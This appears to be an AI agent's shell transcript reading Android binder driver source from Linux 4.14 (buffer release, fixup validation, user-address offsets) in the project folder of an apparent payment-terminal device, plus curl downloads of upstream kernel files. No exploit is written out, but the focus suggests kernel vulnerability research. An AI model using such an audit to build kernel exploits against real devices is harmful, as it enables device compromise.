			struct binder_node *node;

			fp = to_flat_binder_object(hdr);
			node = binder_get_node(proc, fp->binder);
			if (node == NULL) {
				pr_err("transaction release %d bad node %016llx\n",
				       debug_id, (u64)fp->binder);
				break;
			}
			binder_debug(BINDER_DEBUG_TRANSACTION,
				     "        node %d u%016llx\n",
				     node->debug_id, (u64)node->ptr);
			binder_dec_node(node, hdr->type == BINDER_TYPE_BINDER,
					0);
			binder_put_node(node);
		} break;
		case BINDER_TYPE_HANDLE:
		case BINDER_TYPE_WEAK_HANDLE: {
			struct flat_binder_object *fp;
			struct binder_ref_data rdata;
			int ret;

			fp = to_flat_binder_object(hdr);
			ret = binder_dec_ref_for_handle(proc, fp->handle,
				hdr->type == BINDER_TYPE_HANDLE, &rdata);

			if (ret) {
				pr_err("transaction release %d bad handle %d, ret = %d\n",
				 debug_id, fp->handle, ret);
				break;
			}
			binder_debug(BINDER_DEBUG_TRANSACTION,
				     "        ref %d desc %d\n",
				     rdata.debug_id, rdata.desc);
		} break;

		case BINDER_TYPE_FD: {
			struct binder_fd_object *fp = to_binder_fd_object(hdr);

			binder_debug(BINDER_DEBUG_TRANSACTION,
				     "        fd %d\n", fp->fd);
			if (failed_at)
				task_close_fd(proc, fp->fd);
		} break;
		case BINDER_TYPE_PTR:
			/*
			 * Nothing to do here, this will get cleaned up when the
			 * transaction buffer gets freed
			 */
			break;
		case BINDER_TYPE_FDA: {
			struct binder_fd_array_object *fda;
			struct binder_buffer_object *parent;
			uintptr_t parent_buffer;
			u32 *fd_array;
			size_t fd_index;
			binder_size_t fd_buf_size;

			fda = to_binder_fd_array_object(hdr);
			parent = binder_validate_ptr(buffer, fda->parent,
						     off_start,
						     offp - off_start);
			if (!parent) {
				pr_err("transaction release %d bad parent offset",
				       debug_id);
				continue;
			}
			/*
			 * Since the parent was already fixed up, convert it


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3 && grep -n \"binder_get_node\" kern_ref/414_binder.c | head -5; sed -n '/static struct binder_node \\*binder_get_node/,/^}/p' kern_ref/414_binder.c"}

[tool • bash]
1072:static struct binder_node *binder_get_node_ilocked(struct binder_proc *proc,
1100:static struct binder_node *binder_get_node(struct binder_proc *proc,
1106:	node = binder_get_node_ilocked(proc, ptr);
1612: * binder_get_node_from_ref() - get the node from the given proc/desc
1622:static struct binder_node *binder_get_node_from_ref(
static struct binder_node *binder_get_node_ilocked(struct binder_proc *proc,
						   binder_uintptr_t ptr)
{
	struct rb_node *n = proc->nodes.rb_node;
	struct binder_node *node;

	assert_spin_locked(&proc->inner_lock);

	while (n) {
		node = rb_entry(n, struct binder_node, rb_node);

		if (ptr < node->ptr)
			n = n->rb_left;
		else if (ptr > node->ptr)
			n = n->rb_right;
		else {
			/*
			 * take an implicit weak reference
			 * to ensure node stays alive until
			 * call to binder_put_node()
			 */
			binder_inc_node_tmpref_ilocked(node);
			return node;
		}
	}
	return NULL;
}
static struct binder_node *binder_get_node(struct binder_proc *proc,
					   binder_uintptr_t ptr)
{
	struct binder_node *node;

	binder_inner_proc_lock(proc);
	node = binder_get_node_ilocked(proc, ptr);
	binder_inner_proc_unlock(proc);
	return node;
}
static struct binder_node *binder_get_node_from_ref(
		struct binder_proc *proc,
		u32 desc, bool need_strong_ref,
		struct binder_ref_data *rdata)
{
	struct binder_node *node;
	struct binder_ref *ref;

	binder_proc_lock(proc);
	ref = binder_get_ref_olocked(proc, desc, need_strong_ref);
	if (!ref)
		goto err_no_ref;
	node = ref->node;
	/*
	 * Take an implicit reference on the node to ensure
	 * it stays alive until the call to binder_put_node()
	 */
	binder_inc_node_tmpref(node);
	if (rdata)
		*rdata = ref->data;
	binder_proc_unlock(proc);

	return node;

err_no_ref:
	binder_proc_unlock(proc);
	return NULL;
}
static struct binder_node *binder_get_node_refs_for_txn(
		struct binder_node *node,
		struct binder_proc **procp,
		uint32_t *error)
{
	struct binder_node *target_node = NULL;

	binder_node_inner_lock(node);
	if (node->proc) {
		target_node = node;
		binder_inc_node_nilocked(node, 1, 0, NULL);
		binder_inc_node_tmpref_ilocked(node);
		node->proc->tmp_ref++;
		*procp = node->proc;
	} else
		*error = BR_DEAD_REPLY;
	binder_node_inner_unlock(node);

	return target_node;
}


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3 && sed -n '/static size_t binder_validate_object/,/^}/p' kern_ref/414_binder.c; grep -n \"binder_validate_object\" kern_ref/414_binder.c | head -3"}

[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3 && grep -n \"secctx\\|extra_buffers_size\\|security_context\" kern_ref/414_binder.c | head -12"}

[tool • bash]
static size_t binder_validate_object(struct binder_buffer *buffer, u64 offset)
{
	/* Check if we can read a header first */
	struct binder_object_header *hdr;
	size_t object_size = 0;

	if (offset > buffer->data_size - sizeof(*hdr) ||
	    buffer->data_size < sizeof(*hdr) ||
	    !IS_ALIGNED(offset, sizeof(u32)))
		return 0;

	/* Ok, now see if we can read a complete object. */
	hdr = (struct binder_object_header *)(buffer->data + offset);
	switch (hdr->type) {
	case BINDER_TYPE_BINDER:
	case BINDER_TYPE_WEAK_BINDER:
	case BINDER_TYPE_HANDLE:
	case BINDER_TYPE_WEAK_HANDLE:
		object_size = sizeof(struct flat_binder_object);
		break;
	case BINDER_TYPE_FD:
		object_size = sizeof(struct binder_fd_object);
		break;
	case BINDER_TYPE_PTR:
		object_size = sizeof(struct binder_buffer_object);
		break;
	case BINDER_TYPE_FDA:
		object_size = sizeof(struct binder_fd_array_object);
		break;
	default:
		return 0;
	}
	if (offset <= buffer->data_size - object_size &&
	    buffer->data_size >= object_size)
		return object_size;
	else
		return 0;
}
1951: * binder_validate_object() - checks for a valid metadata object in a buffer.
1958:static size_t binder_validate_object(struct binder_buffer *buffer, u64 offset)
2120:		size_t object_size = binder_validate_object(buffer, *offp);


[tool • bash]
2630:			       binder_size_t extra_buffers_size)
2836:			     (u64)extra_buffers_size);
2845:			     (u64)extra_buffers_size);
2861:		tr->offsets_size, extra_buffers_size,
2909:	if (!IS_ALIGNED(extra_buffers_size, sizeof(u64))) {
2912:				  (u64)extra_buffers_size);
2920:	sg_buf_end = sg_bufp + extra_buffers_size;


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3 && sed -n '3040,3060p' kern_ref/414_binder.c; echo ===FDA-site; sed -n '2980,3000p' kern_ref/414_binder.c; echo ===translateFDA; grep -n \"binder_validate_fixup(t->buffer, off_start\" kern_ref/414_binder.c"}

[tool • bash]
				goto err_copy_data_failed;
			}
			/* Fixup buffer pointer to target proc address space */
			bp->buffer = (uintptr_t)sg_bufp +
				binder_alloc_get_user_buffer_offset(
						&target_proc->alloc);
			sg_bufp += ALIGN(bp->length, sizeof(u64));

			ret = binder_fixup_parent(t, thread, bp, off_start,
						  offp - off_start,
						  last_fixup_obj,
						  last_fixup_min_off);
			if (ret < 0) {
				return_error = BR_FAILED_REPLY;
				return_error_param = ret;
				return_error_line = __LINE__;
				goto err_translate_failed;
			}
			last_fixup_obj = bp;
			last_fixup_min_off = 0;
		} break;
===FDA-site
		} break;
		case BINDER_TYPE_FDA: {
			struct binder_fd_array_object *fda =
				to_binder_fd_array_object(hdr);
			struct binder_buffer_object *parent =
				binder_validate_ptr(t->buffer, fda->parent,
						    off_start,
						    offp - off_start);
			if (!parent) {
				binder_user_error("%d:%d got transaction with invalid parent offset or type\n",
						  proc->pid, thread->pid);
				return_error = BR_FAILED_REPLY;
				return_error_param = -EINVAL;
				return_error_line = __LINE__;
				goto err_bad_parent;
			}
			if (!binder_validate_fixup(t->buffer, off_start,
						   parent, fda->parent_offset,
						   last_fixup_obj,
						   last_fixup_min_off)) {
				binder_user_error("%d:%d got transaction with out-of-order buffer fixup\n",
===translateFDA
2996:			if (!binder_validate_fixup(t->buffer, off_start,


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3 && sed -n '2034,2082p' kern_ref/414_binder.c"}

[tool • bash]
 * binder_validate_fixup() - validates pointer/fd fixups happen in order.
 * @b:			transaction buffer
 * @objects_start	start of objects buffer
 * @buffer:		binder_buffer_object in which to fix up
 * @offset:		start offset in @buffer to fix up
 * @last_obj:		last binder_buffer_object that we fixed up in
 * @last_min_offset:	minimum fixup offset in @last_obj
 *
 * Return:		%true if a fixup in buffer @buffer at offset @offset is
 *			allowed.
 *
 * For safety reasons, we only allow fixups inside a buffer to happen
 * at increasing offsets; additionally, we only allow fixup on the last
 * buffer object that was verified, or one of its parents.
 *
 * Example of what is allowed:
 *
 * A
 *   B (parent = A, offset = 0)
 *   C (parent = A, offset = 16)
 *     D (parent = C, offset = 0)
 *   E (parent = A, offset = 32) // min_offset is 16 (C.parent_offset)
 *
 * Examples of what is not allowed:
 *
 * Decreasing offsets within the same parent:
 * A
 *   C (parent = A, offset = 16)
 *   B (parent = A, offset = 0) // decreasing offset within A
 *
 * Referring to a parent that wasn't the last object or any of its parents:
 * A
 *   B (parent = A, offset = 0)
 *   C (parent = A, offset = 0)
 *   C (parent = A, offset = 16)
 *     D (parent = B, offset = 0) // B is not A or any of A's parents
 */
static bool binder_validate_fixup(struct binder_buffer *b,
				  binder_size_t *objects_start,
				  struct binder_buffer_object *buffer,
				  binder_size_t fixup_offset,
				  struct binder_buffer_object *last_obj,
				  binder_size_t last_min_offset)
{
	if (!last_obj) {
		/* Nothing to fix up in */
		return false;
	}



[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3 && grep -n \"failed_at\" kern_ref/414_binder.c"}

[tool • bash]
2099:					      binder_size_t *failed_at)
2107:		     buffer->data_size, buffer->offsets_size, failed_at);
2114:	if (failed_at)
2115:		off_end = failed_at;
2173:			if (failed_at)


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3 && grep -n \"buffer_release(.*)\\|buffer_alloc\\|binder_transaction_buffer_release(\\|free_buf\\|binder_free_buf\\|release(&proc\\|release(&target\" kern_ref/414_binder.c | head; echo ===; grep -n \"binder_transaction_buffer_release\\b\" kern_ref/414_binder.c | head"}

[tool • bash]
2097:static void binder_transaction_buffer_release(struct binder_proc *proc,
3127:	trace_binder_transaction_failed_buffer_release(t->buffer);
3128:	binder_transaction_buffer_release(target_proc, t->buffer, offp);
3133:	binder_alloc_free_buf(&target_proc->alloc, t->buffer);
3402:			trace_binder_transaction_buffer_release(buffer);
3403:			binder_transaction_buffer_release(proc, buffer, NULL);
3404:			binder_alloc_free_buf(&proc->alloc, buffer);
4200:	binder_alloc_deferred_release(&proc->alloc);
===
2097:static void binder_transaction_buffer_release(struct binder_proc *proc,
3128:	binder_transaction_buffer_release(target_proc, t->buffer, offp);
3402:			trace_binder_transaction_buffer_release(buffer);
3403:			binder_transaction_buffer_release(proc, buffer, NULL);


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3 && sed -n '3100,3140p' kern_ref/414_binder.c"}

[tool • bash]
		BUG_ON(target_node == NULL);
		BUG_ON(t->buffer->async_transaction != 1);
		if (!binder_proc_transaction(t, target_proc, NULL))
			goto err_dead_proc_or_thread;
	}
	if (target_thread)
		binder_thread_dec_tmpref(target_thread);
	binder_proc_dec_tmpref(target_proc);
	if (target_node)
		binder_dec_node_tmpref(target_node);
	/*
	 * write barrier to synchronize with initialization
	 * of log entry
	 */
	smp_wmb();
	WRITE_ONCE(e->debug_id_done, t_debug_id);
	return;

err_dead_proc_or_thread:
	return_error = BR_DEAD_REPLY;
	return_error_line = __LINE__;
	binder_dequeue_work(proc, tcomplete);
err_translate_failed:
err_bad_object_type:
err_bad_offset:
err_bad_parent:
err_copy_data_failed:
	trace_binder_transaction_failed_buffer_release(t->buffer);
	binder_transaction_buffer_release(target_proc, t->buffer, offp);
	if (target_node)
		binder_dec_node_tmpref(target_node);
	target_node = NULL;
	t->buffer->transaction = NULL;
	binder_alloc_free_buf(&target_proc->alloc, t->buffer);
err_binder_alloc_buf_failed:
	kfree(tcomplete);
	binder_stats_deleted(BINDER_STAT_TRANSACTION_COMPLETE);
err_alloc_tcomplete_failed:
	kfree(t);
	binder_stats_deleted(BINDER_STAT_TRANSACTION);
err_alloc_t_failed:


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3 && grep -n \"user_buffer_offset\\|user_vm_start\" kern_ref/414_binder_alloc.c | head -20; echo ===; sed -n '/static struct binder_buffer \\*binder_alloc_new_buf_locked/,/^}/p' kern_ref/414_binder_alloc.c | head -60"}

[tool • bash]
===


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3 && ls kern_ref/; grep -rn \"user_buffer_offset\" kern_ref/*.c | head -8"}

[tool • bash]
414_binder_alloc.c
414_binder.c
414_binder.h
414_eventpoll.c
5x_binder.c
aosp414.c
kern_ref/414_binder.c:2204:				binder_alloc_get_user_buffer_offset(
kern_ref/414_binder.c:2443:		binder_alloc_get_user_buffer_offset(&target_proc->alloc);
kern_ref/414_binder.c:2511:			binder_alloc_get_user_buffer_offset(
kern_ref/414_binder.c:3044:				binder_alloc_get_user_buffer_offset(
kern_ref/414_binder.c:4010:			binder_alloc_get_user_buffer_offset(&proc->alloc));


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3 && grep -n \"user_buffer_offset\\|user_vm_start\" kern_ref/414_binder.h kern_ref/aosp414.c 2>/dev/null | head; sed -n '/binder_alloc_get_user_buffer_offset/,+8p' kern_ref/414_binder.h 2>/dev/null | head -12"}

[tool • bash]
(no output)

[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3 && head -30 kern_ref/414_binder.h; echo ======; grep -n \"user_buffer_offset\\|user_vm_start\\|vma\\b\" kern_ref/414_binder.h kern_ref/aosp414.c | head -12"}

[tool • bash]
/* SPDX-License-Identifier: GPL-2.0 WITH Linux-syscall-note */
/*
 * Copyright (C) 2008 Google, Inc.
 *
 * Based on, but no longer compatible with, the original
 * OpenBinder.org binder driver interface, which is:
 *
 * Copyright (c) 2005 Palmsource, Inc.
 *
 * This software is licensed under the terms of the GNU General Public
 * License version 2, as published by the Free Software Foundation, and
 * may be copied, distributed, and modified under those terms.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 */

#ifndef _UAPI_LINUX_BINDER_H
#define _UAPI_LINUX_BINDER_H

#include <linux/types.h>
#include <linux/ioctl.h>

#define B_PACK_CHARS(c1, c2, c3, c4) \
	((((c1)<<24)) | (((c2)<<16)) | (((c3)<<8)) | (c4))
#define B_TYPE_LARGE 0x85

======


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3 && grep -rn \"user_buffer_offset\" kern_ref/414_binder_alloc.c | head -6; ls -la kern_ref/414_binder_alloc.c; grep -c \"\" kern_ref/414_binder_alloc.c"}

[tool • bash]
-rw-rw-r-- 1 enryu enryu 313 Nov 15 10:51 kern_ref/414_binder_alloc.c
2


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3 && cat kern_ref/414_binder_alloc.c; echo ====; grep -rn \"binder_alloc_get_user_buffer_offset\" kern_ref/414_binder.c | head -3; sed -n '/binder_alloc_get_user_buffer_offset\\|binder_alloc_new_buf\\b/,+10p' kern_ref/414_binder.c | head -40"}

[tool • bash]
429: This request was rate-limited due to too many requests from your network. Reduce the frequency of your requests or try again later.
For more on scraping GitHub and how it may affect your rights, please review our Terms of Service (https://docs.github.com/en/site-policy/github-terms/github-terms-of-service).====
2204:				binder_alloc_get_user_buffer_offset(
2443:		binder_alloc_get_user_buffer_offset(&target_proc->alloc);
2511:			binder_alloc_get_user_buffer_offset(
				binder_alloc_get_user_buffer_offset(
						&proc->alloc);

			fd_buf_size = sizeof(u32) * fda->num_fds;
			if (fda->num_fds >= SIZE_MAX / sizeof(u32)) {
				pr_err("transaction release %d invalid number of fds (%lld)\n",
				       debug_id, (u64)fda->num_fds);
				continue;
			}
			if (fd_buf_size > parent->length ||
			    fda->parent_offset > parent->length - fd_buf_size) {
		binder_alloc_get_user_buffer_offset(&target_proc->alloc);
	fd_array = (u32 *)(parent_buffer + (uintptr_t)fda->parent_offset);
	if (!IS_ALIGNED((unsigned long)fd_array, sizeof(u32))) {
		binder_user_error("%d:%d parent offset not aligned correctly.\n",
				  proc->pid, thread->pid);
		return -EINVAL;
	}
	for (fdi = 0; fdi < fda->num_fds; fdi++) {
		target_fd = binder_translate_fd(fd_array[fdi], t, thread,
						in_reply_to);
		if (target_fd < 0)
			binder_alloc_get_user_buffer_offset(
				&target_proc->alloc));
	*(binder_uintptr_t *)(parent_buffer + bp->parent_offset) = bp->buffer;

	return 0;
}

/**
 * binder_proc_transaction() - sends a transaction to a process and wakes it up
 * @t:		transaction to send
 * @proc:	process to send the transaction to
	t->buffer = binder_alloc_new_buf(&target_proc->alloc, tr->data_size,
		tr->offsets_size, extra_buffers_size,
		!reply && (t->flags & TF_ONE_WAY));
	if (IS_ERR(t->buffer)) {
		/*
		 * -ESRCH indicates VMA cleared. The target is dying.
		 */


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3/kern_ref && sed -n '4000,4020p' 414_binder.c; grep -n \"buffer->user_data\\|user_data = \\|binder_alloc_new_buf_ret\" 414_binder.c | head"}

[tool • bash]
			tr.sender_pid = task_tgid_nr_ns(sender,
							task_active_pid_ns(current));
		} else {
			tr.sender_pid = 0;
		}

		tr.data_size = t->buffer->data_size;
		tr.offsets_size = t->buffer->offsets_size;
		tr.data.ptr.buffer = (binder_uintptr_t)
			((uintptr_t)t->buffer->data +
			binder_alloc_get_user_buffer_offset(&proc->alloc));
		tr.data.ptr.offsets = tr.data.ptr.buffer +
					ALIGN(t->buffer->data_size,
					    sizeof(void *));

		if (put_user(cmd, (uint32_t __user *)ptr)) {
			if (t_from)
				binder_thread_dec_tmpref(t_from);
			return -EFAULT;
		}
		ptr += sizeof(uint32_t);


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3 && grep -rn \"user_buffer_offset\\|user_vm_start\\|buffer_offset\\|ALIGN(buffer\" kern_ref/414_binder.c | grep -v \"fd_buf\\|parent_offset\\|off_start\" | head -12"}

[tool • bash]
2113:				      ALIGN(buffer->data_size, sizeof(void *)));
2204:				binder_alloc_get_user_buffer_offset(
2443:		binder_alloc_get_user_buffer_offset(&target_proc->alloc);
2511:			binder_alloc_get_user_buffer_offset(
3044:				binder_alloc_get_user_buffer_offset(
4010:			binder_alloc_get_user_buffer_offset(&proc->alloc));


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3 && grep -rn \"user_buffer_offset\" ~/.local/src 2>/dev/null | head -3; curl -sS --max-time 20 \"https://raw.githubusercontent.com/torvalds/linux/v4.14/drivers/android/binder_alloc.h\" -o /dev/null -w \"%{http_code}\\n\" 2>&1 | tail -1"}

[tool • bash]
200


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3/kern_ref && curl -sS --max-time 30 \"https://raw.githubusercontent.com/torvalds/linux/v4.14/drivers/android/binder_alloc.h\" -o binder_alloc.h && grep -n \"user_buffer_offset\\|user_vm_start\" binder_alloc.h | head"}

[tool • bash]
85: * @user_buffer_offset: offset between user and kernel VAs for buffer
106:	ptrdiff_t user_buffer_offset;
165: * binder_alloc_get_user_buffer_offset() - get offset between kernel/user addrs
172:binder_alloc_get_user_buffer_offset(struct binder_alloc *alloc)
175:	 * user_buffer_offset is constant if vma is set and
182:	return alloc->user_buffer_offset;


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3/kern_ref && grep -n \"user_buffer_offset\" binder_alloc.h; sed -n '75,110p' binder_alloc.h; echo ===setvma; curl -sS --max-time 30 \"https://raw.githubusercontent.com/torvalds/linux/v4.14/drivers/android/binder_alloc.c\" -o binder_alloc.c 2>/dev/null && grep -n \"user_buffer_offset\" binder_alloc.c | head -6 && sed -n \"$(grep -n 'map_user\\|user_buffer_offset =' binder_alloc.c | head -2 | tail -1 | cut -d: -f1),+8p\" binder_alloc.c"}

[tool • bash]
85: * @user_buffer_offset: offset between user and kernel VAs for buffer
106:	ptrdiff_t user_buffer_offset;
165: * binder_alloc_get_user_buffer_offset() - get offset between kernel/user addrs
172:binder_alloc_get_user_buffer_offset(struct binder_alloc *alloc)
175:	 * user_buffer_offset is constant if vma is set and
182:	return alloc->user_buffer_offset;
};

/**
 * struct binder_alloc - per-binder proc state for binder allocator
 * @vma:                vm_area_struct passed to mmap_handler
 *                      (invarient after mmap)
 * @tsk:                tid for task that called init for this proc
 *                      (invariant after init)
 * @vma_vm_mm:          copy of vma->vm_mm (invarient after mmap)
 * @buffer:             base of per-proc address space mapped via mmap
 * @user_buffer_offset: offset between user and kernel VAs for buffer
 * @buffers:            list of all buffers for this proc
 * @free_buffers:       rb tree of buffers available for allocation
 *                      sorted by size
 * @allocated_buffers:  rb tree of allocated buffers sorted by address
 * @free_async_space:   VA space available for async buffers. This is
 *                      initialized at mmap time to 1/2 the full VA space
 * @pages:              array of binder_lru_page
 * @buffer_size:        size of address space specified via mmap
 * @pid:                pid for associated binder_proc (invariant after init)
 *
 * Bookkeeping structure for per-proc address space management for binder
 * buffers. It is normally initialized during binder_init() and binder_mmap()
 * calls. The address space is used for both user-visible buffers and for
 * struct binder_buffer objects used to track the user buffers
 */
struct binder_alloc {
	struct mutex mutex;
	struct vm_area_struct *vma;
	struct mm_struct *vma_vm_mm;
	void *buffer;
	ptrdiff_t user_buffer_offset;
	struct list_head buffers;
	struct rb_root free_buffers;
	struct rb_root allocated_buffers;
	size_t free_async_space;
===setvma
139:	kern_ptr = (void *)(user_ptr - alloc->user_buffer_offset);
276:			(uintptr_t)page_addr + alloc->user_buffer_offset;
678:	alloc->user_buffer_offset =
940:			       page_addr + alloc->user_buffer_offset,
		trace_binder_unmap_user_start(alloc, index);

		zap_page_range(vma,
			       page_addr + alloc->user_buffer_offset,
			       PAGE_SIZE);

		trace_binder_unmap_user_end(alloc, index);

		up_write(&mm->mmap_sem);
